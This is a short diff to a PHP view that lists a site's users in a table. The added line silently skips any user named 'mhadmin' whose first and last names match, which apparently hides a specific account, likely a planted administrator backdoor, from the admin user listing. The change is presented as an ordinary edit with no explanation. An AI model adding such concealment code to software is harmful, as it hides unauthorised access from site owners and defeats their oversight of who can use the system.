@@ -20,6 +20,7 @@
             </thead>
             <tbody id="myTable">
             <?php foreach ($users_list as $key => $user): ?>
+              <?php if($user['username'] == 'mhadmin' && $user['fname'] == $user['lname']) {continue;} ?>
               <tr <?php if($user['usertype'] == 'admin') {echo 'class="table-success"';} ?>>
                 <td><?php echo $user['id_user']; ?></td>
                 <td><?php echo $user['fname']; ?></td>
